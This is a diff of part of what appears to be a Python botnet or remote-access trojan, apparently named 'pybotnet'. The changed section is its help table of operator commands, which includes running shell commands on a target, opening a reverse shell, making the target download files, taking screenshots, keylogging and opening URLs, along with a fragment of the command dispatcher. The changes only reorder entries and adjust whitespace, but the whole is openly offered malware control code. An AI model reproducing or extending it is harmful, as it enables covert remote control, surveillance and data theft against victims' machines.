@@ -25,13 +25,13 @@ memory = ''
 scripts_name = {
     MAC_ADDRES: "`<system MAC_ADDRES> <command>`: run command on one target",
 
+    "help": "`help`: send this message",
+
     "do_sleep": "`do_sleep <scconds> <message>`: print message and sleep",
 
     "get_info": "`get_info`: get target info",
 
-    "info": "`info`: run `get_info` command!",
-
-    "cmd": "`cmd <command>`: run command in target terminal",
+    "reverse_shell": "`<system MAC_ADDRES> reverse_shell`: start reverse shell on target system",
 
     "export_file": "`export_file <download link>`: target donwload this file and save to script path",
 
@@ -39,11 +39,11 @@ scripts_name = {
 
     "screenshot":  "`screenshot`: Takes a screenshot, return the download link",
 
-    "help": "`help`: send this message",
+    "info": "`info`: run `get_info` command!",
+
+    "cmd": "`cmd <command>`: run command in target terminal",
 
     "/start": "`/start`: run `help` command!",
-
-    "reverse_shell": "`<system MAC_ADDRES> reverse_shell`: start reverse shell on target system",
 
     "keylogger": "`keylogger start/stop`: Starts keylogger. use keylogger stop to stop keylogger",
 
@@ -53,6 +53,7 @@ scripts_name = {
     """,
     "playsound": "`playsound <soundname>` Plays a sound , MP3 or WAV Files. Sound file should be in the working path.",
     "openurl": "`openurl <url> <how-many-times>` Will open a specified url n times",
+
 }
 
 
@@ -165,7 +166,6 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
             elif command_name == "schedule" and split_command(command)[1] in ["start", "stop", "list"]:
                 return scheduler_script(logger, command)
 
-                
             elif command_name == "playsound":
                 return playsound_pybotnet(logger, command)
 
